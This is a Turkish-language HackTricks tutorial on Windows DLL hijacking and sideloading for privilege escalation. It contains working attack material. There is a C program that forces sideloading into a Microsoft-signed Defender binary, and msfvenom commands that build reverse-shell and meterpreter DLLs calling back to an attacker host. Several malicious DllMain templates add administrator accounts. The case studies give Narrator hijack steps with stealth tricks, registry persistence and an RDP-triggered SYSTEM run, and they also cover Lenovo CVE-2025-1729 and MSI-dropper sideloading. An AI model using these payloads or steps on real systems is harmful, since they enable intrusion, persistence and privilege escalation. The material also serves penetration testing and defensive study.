# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilir bir uygulamanın zararlı bir DLL yüklemesini sağlayacak şekilde manipüle edilmesini içerir. Bu terim **DLL Spoofing, Injection ve Side-Loading** gibi birkaç taktiği kapsar. Genellikle code execution, persistence ve daha nadiren privilege escalation için kullanılır. Burada eskalasyona odaklanılsa da, hijacking yöntemi hedeflerden bağımsız olarak aynıdır.

### Yaygın Yöntemler

DLL hijacking için kullanılan birkaç yöntem vardır; her birinin etkinliği uygulamanın DLL yükleme stratejisine bağlıdır:

1. **DLL Replacement**: Gerçek bir DLL'in yerine zararlı bir tane koymak; orijinal DLL işlevselliğini korumak için opsiyonel olarak DLL Proxying kullanılır.
2. **DLL Search Order Hijacking**: Zararlı DLL'i, meşru olanın önünde aranacak bir arama yoluna yerleştirerek uygulamanın arama deseninden yararlanma.
3. **Phantom DLL Hijacking**: Uygulamanın yükleyeceğini düşündüğü, aslında mevcut olmayan bir gerekli DLL için zararlı bir DLL oluşturma.
4. **DLL Redirection**: Uygulamanın zararlı DLL'e yönlendirilmesi için %PATH% veya .exe.manifest / .exe.local gibi arama parametrelerini değiştirme.
5. **WinSxS DLL Replacement**: WinSxS dizininde meşru DLL'in yerine zararlı bir muadil koyma; bu yöntem genellikle DLL side-loading ile ilişkilidir.
6. **Relative Path DLL Hijacking**: Zararlı DLL'i, kopyalanmış uygulama ile birlikte kullanıcı kontrolündeki bir dizine koymak; Binary Proxy Execution tekniklerine benzer.

## Eksik Dll'leri Bulma

Sistemdeki eksik Dll'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **aşağıdaki 2 filtreyi** ayarlamaktır:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

ve yalnızca **File System Activity** gösterin:

![](<../../../images/image (153).png>)

Eğer genel olarak **eksik dll'ler** arıyorsanız, bunu birkaç **saniye** çalıştırılmış bırakın.\
Belirli bir yürütülebilir dosya içindeki **eksik dll'i** arıyorsanız, **"Process Name" "contains" `<exec name>`** gibi başka bir filtre eklemeli, uygulamayı çalıştırmalı ve olay yakalamayı durdurmalısınız.

## Eksik Dll'leri Sömürme

Eskalasyon sağlamak için en iyi şansımız, ayrıcalıklı bir sürecin yüklemeye çalışacağı bir dll'i, o dll'in aranacağı yerlerden birine yazabilmektir. Bu sayede ya **orijinal dll'in bulunduğu klasörden önce** aranan bir klasöre dll yazabiliriz (garip bir durum), ya da orijinal **dll'in hiçbir klasörde bulunmadığı** ve dll'in aranacağı bir klasöre yazma imkanımız olur.

### Dll Arama Sırası

[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) içinde Dll'lerin nasıl yüklendiğini özellikle bulabilirsiniz.

Windows uygulamaları, DLL'ler için önceden tanımlanmış bir dizi arama yolunu belirli bir sıra ile izleyerek arama yapar. DLL hijacking sorunu, zararlı bir DLL'in bu dizinlerden birine stratejik olarak yerleştirilmesi ve böylece orijinal DLL'den önce yüklenmesinin sağlanmasıyla ortaya çıkar. Bunu önlemenin bir yolu, uygulamanın ihtiyaç duyduğu DLL'lere başvururken mutlak yollar kullanmasını sağlamaktır.

32-bit sistemlerdeki DLL arama sırasını aşağıda görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) fonksiyonunu kullanın.(_C:\Windows\System32_)
3. 16-bit sistem dizini. Bu dizinin yolunu elde eden bir fonksiyon yoktur ama yine de aranır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) fonksiyonunu kullanın.
1. (_C:\Windows_)
5. Geçerli dizin.
6. PATH ortam değişkeninde listelenen dizinler. Bunun, App Paths kayıt anahtarı tarafından belirtilen uygulama başına yolunu içermediğini unutmayın. App Paths anahtarı DLL arama yolu hesaplanırken kullanılmaz.

Bu, SafeDllSearchMode etkinleştirildiğinde varsayılan arama sırasıdır. Devre dışı bırakıldığında geçerli dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode kayıt değerini oluşturun ve 0 olarak ayarlayın (varsayılan etkin).

Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) fonksiyonu **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa, arama LoadLibraryEx'in yüklemekte olduğu yürütülebilir modülün dizininde başlar.

Son olarak, bir dll sadece adı yerine mutlak yol belirtilerek yüklenebilir. Bu durumda o dll yalnızca belirtilen yolda aranacaktır (eğer dll'in bağımlılıkları varsa, onlar adla yüklendiği gibi aranacaktır).

Arama sırasını değiştirmeye yönelik başka yollar da vardır fakat bunları burada açıklamayacağım.

### RTL_USER_PROCESS_PARAMETERS.DllPath ile sideloading'i zorlamak

Yeni oluşturulan bir sürecin DLL arama yolunu deterministik olarak etkilemenin gelişmiş bir yolu, süreci ntdll’in native API'leri ile oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya saldırgan kontrollü bir dizin verilirse, bir hedef süreç isimle (mutlak yol olmadan ve safe loading flag'leri kullanmadan) bir import DLL'i çözdüğünde, o dizinden zararlı bir DLL yüklemeye zorlanabilir.

Ana fikir
- Process parametrelerini RtlCreateProcessParametersEx ile oluşturun ve kontrollü klasörünüzü (ör. dropper/unpacker'ın bulunduğu dizin) işaret eden özel bir DllPath sağlayın.
- Süreci RtlCreateUserProcess ile oluşturun. Hedef ikili bir DLL'i adla çözdüğünde, loader bu sağlanan DllPath'i çözümleme sırasında danışacak ve böylece zararlı DLL hedef EXE ile aynı konumda olmasa bile güvenilir sideloading mümkün olacaktır.

Notlar/sınırlamalar
- Bu, oluşturulan child process'i etkiler; SetDllDirectory'den farklı olarak yalnızca mevcut süreci etkilemez.
- Hedefin bir DLL'i adla import etmesi veya LoadLibrary ile adla yüklemesi gerekir (mutlak yol olmadan ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanılmıyor olmalı).
- KnownDLLs ve sert kodlanmış mutlak yollar ele geçirilemez. Forwarded exports ve SxS önceliği değiştirebilir.

Minimal C örneği (ntdll, wide strings, basitleştirilmiş hata yönetimi):

<details>
<summary>Tam C örneği: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasyonel kullanım örneği
- Kötü amaçlı xmllite.dll'yi (gerekli fonksiyonları export eden veya gerçek olanına proxy yapan) DllPath dizininize yerleştirin.
- Yukarıdaki teknikle isminden xmllite.dll aradığı bilinen imzalı bir ikiliyi başlatın. Loader, importu verilen DllPath aracılığıyla çözer ve DLL'inizi sideload eder.

Bu teknik, sahada multi-stage sideloading zincirlerini tetiklemek için gözlemlenmiştir: bir initial launcher bir helper DLL bırakır; bu da daha sonra özel bir DllPath ile Microsoft-signed, hijackable bir ikili spawn eder ve saldırganın DLL'inin bir staging directory'den yüklenmesini zorlar.


#### Windows belgelerindeki dll arama sırasına ilişkin istisnalar

Standart DLL arama sırasına ilişkin bazı istisnalar Windows belgelerinde belirtilmiştir:

- Bir **adı bellekte zaten yüklü olan bir DLL ile aynı olan DLL** ile karşılaşıldığında, sistem olağan aramayı atlar. Bunun yerine, bellekteki DLL'e dönmeden önce yönlendirme ve manifest için bir kontrol gerçekleştirir. **Bu senaryoda sistem DLL için bir arama yapmaz**.
- DLL mevcut Windows sürümü için bir **known DLL** olarak tanındığında, sistem known DLL'in kendi sürümünü ve varsa onun bağımlı DLL'lerini kullanır, **arama sürecini atlayarak**. Kayıt defteri anahtarı **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bu known DLL'lerin bir listesini tutar.
- Bir **DLL'in bağımlılıkları olması** durumunda, bu bağımlı DLL'ler için yapılan arama, ilk DLL tam yol ile tanımlanmış olsa bile, sanki bunlar yalnızca **module names** ile belirtilmiş gibi yürütülür.

### Yetki Yükseltme

**Gereksinimler**:

- Farklı ayrıcalıklar altında (horizontal or lateral movement) çalışan veya çalışacak ve **bir DLL'den yoksun olan** bir süreci belirleyin.
- **DLL**'in aranacağı herhangi bir **dizin** için **yazma izninin** mevcut olduğundan emin olun. Bu konum yürütülebilir dosyanın dizini veya system path içindeki bir dizin olabilir.

Evet, gereksinimleri bulmak zordur çünkü **varsayılan olarak ayrıcalıklı bir yürütülebilir dosyanın bir DLL'den yoksun olması tuhaftır** ve bir **system path klasöründe yazma iznine sahip olmak** daha da tuhaftır (varsayılan olarak bunu yapamazsınız). Ancak hatalı yapılandırılmış ortamlarda bu mümkün olabilir.\
Şanslıysanız ve gereksinimleri karşılıyorsanız, [UACME](https://github.com/hfiref0x/UACME) projesine bakabilirsiniz. Projenin **ana amacı UAC'i bypass etmek** olsa bile, kullanabileceğiniz Windows sürümü için bir **PoC** of a Dll hijaking orada bulabilirsiniz (muhtemelen sadece yazma iznine sahip olduğunuz klasörün yolunu değiştirerek).

Bir klasörde **izinlerinizi kontrol edebileceğinizi** unutmayın:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm dizinlerin izinlerini kontrol edin**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ayrıca bir executable'ın imports'larını ve bir dll'in exports'larını şu komutla kontrol edebilirsiniz:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) system PATH içindeki herhangi bir klasörde yazma izniniz olup olmadığını kontrol eder.\
Bu zafiyeti keşfetmek için diğer ilginç otomatik araçlar PowerSploit fonksiyonlarıdır: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_.

### Örnek

Eğer exploitable bir senaryo bulursanız, bunu başarılı şekilde exploit etmek için en önemli şeylerden biri, executable'ın ondan import edeceği en azından tüm fonksiyonları export eden bir dll oluşturmaktır. Ayrıca, Dll Hijacking'in [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) için kullanışlı olduğunu unutmayın. Bu yürütme amaçlı dll hijacking çalışmasında **geçerli bir dll nasıl oluşturulur** örneğini bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Ayrıca, bir sonraki bölümde şablon olarak kullanabileceğiniz veya gerekmeyen fonksiyonları dışa aktaran bir dll oluşturmak için faydalı olabilecek bazı temel dll kodları bulabilirsiniz.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Temelde bir **Dll proxy**, yüklendiğinde kötü amaçlı kodunuzu çalıştırabilen, aynı zamanda gerçek kütüphaneye yapılan tüm çağrıları ileterek beklendiği gibi davranan ve işlevselliği sağlayan bir Dll'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) araçları ile aslında bir executable belirleyip proxify etmek istediğiniz kütüphaneyi seçebilir ve proxified dll üretebilir ya da Dll'i belirleyip proxified dll oluşturabilirsiniz.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter (x86) alın:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kullanıcı oluştur (x86, x64 sürümünü görmedim):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi

Unutmayın ki bazı durumlarda derlediğiniz Dll, victim process tarafından yüklenecek **export several functions**'ı barındırmalıdır; bu fonksiyonlar mevcut değilse **binary won't be able to load** ve **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL kullanıcı oluşturma içeren örnek</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>İş parçacığı girişli alternatif C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Vaka İncelemesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe, başlamada öngörülebilir, dile özgü bir yerelleştirme DLL'ini halen deniyor; bu DLL hijack edilerek arbitrary code execution ve persistence sağlanabilir.

Key facts
- Deneme yolu (güncel build'ler): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Eski yol (eski build'ler): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Eğer OneCore yolunda saldırgan kontrolündeki yazılabilir bir DLL mevcutsa, bu yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalıştırılır. Export'lar gerekli değildir.

Discovery with Procmon
- Filtre: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki yolun yüklenmeye çalışıldığını gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC sessizliği
- A naive hijack UI'yi konuşur/vurgular. Sessiz kalmak için, on attach Narrator iş parçacıklarını enumerate edin, ana iş parçacığını açın (`OpenThread(THREAD_SUSPEND_RESUME)`) ve `SuspendThread` ile durdurun; kendi iş parçacığınızda devam edin. Tam kod için PoC'ye bakın.

Erişilebilirlik yapılandırmasıyla tetikleme ve kalıcılık
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle, Narrator başlatıldığında yerleştirilen DLL yüklenir. Güvenli masaüstünde (oturum açma ekranı) Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host'a RDP ile bağlanın, oturum açma ekranında Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.
- RDP oturumu kapandığında yürütme durur — bu yüzden hızla inject/migrate edin.

Bring Your Own Accessibility (BYOA)
- Yerleşik bir Erişilebilirlik Aracı (Accessibility Tool, AT) kayıt girdisini (ör. CursorIndicator) klonlayabilir, rasgele bir binary/DLL'e işaret edecek şekilde düzenleyip içe aktarabilir, ardından `configuration` değerini o AT ismine ayarlayabilirsiniz. Bu, Erişilebilirlik altyapısı altında rastgele yürütmeyi sağlar.

Notlar
- `%windir%\System32` altına yazmak ve HKLM değerlerini değiştirmek yönetici hakları gerektirir.
- Tüm payload mantığı `DLL_PROCESS_ATTACH` içinde olabilir; export gerekmez.

## Vaka İncelemesi: CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Yetki Yükseltme

Bu vaka Lenovo'nun TrackPoint Quick Menu'sünde (`TPQMAssistant.exe`) görülen **Phantom DLL Hijacking** zafiyetini gösterir; takip numarası **CVE-2025-1729**.

### Zafiyet Detayları

- **Bileşen**: `TPQMAssistant.exe` şu konumda: `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Zamanlanmış Görev**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` günlük 9:30'da oturum açmış kullanıcı bağlamında çalışır.
- **Dizin İzinleri**: `CREATOR OWNER` tarafından yazılabilir, bu da yerel kullanıcıların rastgele dosya bırakmasına olanak tanır.
- **DLL Arama Davranışı**: Önce çalışma dizininden `hostfxr.dll` yüklemeyi dener ve eksikse "NAME NOT FOUND" kaydı yapar; bu, yerel dizin arama önceliğini gösterir.

### İstismar Uygulaması

Bir saldırgan aynı dizine kötü amaçlı bir `hostfxr.dll` stub'u koyabilir; eksik DLL'i suistimal ederek kullanıcının bağlamında kod yürütmesi elde edebilir:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Saldırı Akışı

1. Standart bir kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Zamanlanmış görevin mevcut kullanıcının bağlamında 09:30'da çalışmasını bekleyin.
3. Görev çalışırken bir yönetici oturum açmışsa, kötü amaçlı DLL yönetici oturumunda medium integrity seviyesinde çalışır.
4. medium integrity'den SYSTEM ayrıcalıklarına yükseltmek için standart UAC bypass tekniklerini zincirleyin.

## Vaka Çalışması: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Tehdit aktörleri sık sık MSI tabanlı dropper'ları DLL side-loading ile eşleştirir ve payload'ları güvenilir, imzalı bir süreç altında çalıştırır.

Zincir özeti
- Kullanıcı MSI'yi indirir. GUI kurulum sırasında (ör. LaunchApplication veya bir VBScript action) sessizce bir CustomAction çalışır ve gömülü kaynaklardan bir sonraki aşamayı yeniden oluşturur.
- Dropper aynı dizine meşru, imzalı bir EXE ve kötü amaçlı bir DLL yazar (örnek çift: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- İmzalı EXE başlatıldığında, Windows DLL search order çalışma dizininden wsc.dll'i önce yükler ve imzalı bir üst süreç altında saldırgan kodunu çalıştırır (ATT&CK T1574.001).

MSI analizi (nelere bakılmalı)
- CustomAction table:
- Yürütülebilir dosyaları veya VBScript çalıştıran girdilere bakın. Şüpheli örnek desen: LaunchApplication'ın arka planda gömülü bir dosyayı çalıştırması.
- Orca (Microsoft Orca.exe) içinde CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB içindeki gömülü/bölünmüş payload'lar:
- Yönetici çıkarma: msiexec /a package.msi /qb TARGETDIR=C:\out
- Veya lessmsi kullanın: lessmsi x package.msi C:\out
- VBScript CustomAction tarafından birleştirilen ve çözülen birden fazla küçük parça arayın. Yaygın akış:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Bu iki dosyayı aynı klasöre koyun:
- wsc_proxy.exe: meşru imzalı host (Avast). İşlem kendi dizininden wsc.dll'i adıyla yüklemeye çalışır.
- wsc.dll: attacker DLL. Eğer spesifik exports gerekliyse, DllMain yeterli olabilir; aksi takdirde, bir proxy DLL oluşturun ve gerekli exports'ları gerçek kütüphaneye yönlendirirken payload'u DllMain içinde çalıştırın.
- Minimal bir DLL payload oluşturun:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- İhraç gereksinimleri için, payload'unuzu da çalıştıran bir forwarding DLL üretmek amacıyla bir proxying framework (ör. DLLirant/Spartacus) kullanın.

- Bu teknik, host binary tarafından yapılan DLL ad çözümlemesine dayanır. Eğer host mutlak yollar veya güvenli yükleme bayrakları (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa, hijack başarısız olabilir.
- KnownDLLs, SxS, and forwarded exports önceliği etkileyebilir ve host binary ile export seti seçilirken dikkate alınmalıdır.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
